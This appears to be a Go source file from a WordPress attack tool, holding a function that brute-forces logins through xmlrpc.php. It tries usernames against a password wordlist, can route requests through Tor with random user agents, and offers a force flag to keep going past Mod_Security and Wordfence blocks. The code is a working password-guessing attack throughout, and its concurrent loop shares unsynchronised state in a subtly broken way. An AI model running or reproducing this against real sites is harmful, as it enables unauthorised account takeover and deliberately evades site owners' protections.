package fuzzing

import (
	"fmt"
	"strings"
	"time"

	. "github.com/blackcrw/wprecon/cli/config"
	"github.com/blackcrw/wprecon/pkg/gohttp"
	"github.com/blackcrw/wprecon/pkg/printer"
	"github.com/blackcrw/wprecon/tools/wordpress/commons"
	"github.com/blackcrw/wprecon/tools/wordpress/extensions"
)

func XMLRPC() int {
	usernamess := InfosWprecon.OtherInformationsString["target.http.fuzzing.usernames"]
	passwordsfile := InfosWprecon.OtherInformationsString["target.http.fuzzing.passwords.file.wordlist"]

	if usernamess == "" || passwordsfile == "" {
		printer.Danger("Error, check if you entered the username and your password wordlist.")
		return 0
	}

	if check, _ := commons.XMLRPC(); check == "mod_security" && !InfosWprecon.Force {
		printer.Danger("xmlrpc is protected by Mod_Security!, if you want to force the process, set the -f flag.")
		return 0
	} else if check == "forbidden" && !InfosWprecon.Force {
		printer.Danger("The target's xmlrpc returned a 403 (forbidden), I don't have access to xmlrpc, if you want to force the process, set the -f flag.")
		return 0
	} else if check == "false" && !InfosWprecon.Force {
		printer.Danger("apparently this target does not have xmlrpc enabled.")
		return 0
	}

	newtopline := printer.NewTopLine(":: Loading wordlist... ::")

	passwords, passwordscount := extensions.ReadAllFile(passwordsfile)

	done := false

	for _, username := range strings.Split(usernamess, ",") {
		for key, password := range passwords {
			if !done {
				go func() {
					newtopline.Progress(passwordscount, "Username:", username, "— Password:", password)

					is, err := xmlrpcSimpleRequest(username, password)

					if err != nil {
						newtopline.DownLine()
						printer.Fatal(err)
					}

					if is {
						newtopline.Done("Passoword Found!")
						printer.Done("Username:", username, "— Password:", password)
						done = true
					} else if passwordscount == key {
						newtopline.Danger("No password worked for the user:", username)
					}
				}()
			} else {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
		done = false
	}

	return 0
}

func xmlrpcSimpleRequest(username, password string) (bool, error) {
	http := gohttp.NewHTTPClient()
	http.SetMethod("POST")
	http.SetURL(InfosWprecon.Target)
	http.SetURLDirectory("xmlrpc.php")
	http.OnTor(InfosWprecon.OtherInformationsBool["http.options.tor"])
	http.OnRandomUserAgent(InfosWprecon.OtherInformationsBool["http.options.randomuseragent"])
	http.OnTLSCertificateVerify(InfosWprecon.OtherInformationsBool["http.options.tlscertificateverify"])
	http.SetData(fmt.Sprintf(`<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`, username, password))

	response, err := http.Run()

	if err != nil {
		return false, err
	}

	// containsPasswordErr := strings.Contains(response.Raw, "Incorrect username or password.")
	containsAdmin := strings.Contains(strings.ToLower(response.Raw), "admin")
	containsModSecurity := strings.Contains(response.Raw, "This error was generated by Mod_Security.")
	wordfenceBlock := strings.Contains(response.Raw, "Your access to this site has been temporarily limited by the site owner")

	if containsModSecurity {
		return false, fmt.Errorf("Oops Mod_Security detected in xmlrpc.php.")
	} else if wordfenceBlock {
		return false, fmt.Errorf("Your access to this target's xmlrpc.php has been blocked, apparently by a waf.")
	} else if response.Response.StatusCode == 503 {
		return false, fmt.Errorf("Oops, I don't know what happened ... but I had an undue return. Status Code: %d", response.Response.StatusCode)
	} else if containsAdmin {
		return true, nil
	} else {
		return false, nil
	}
}
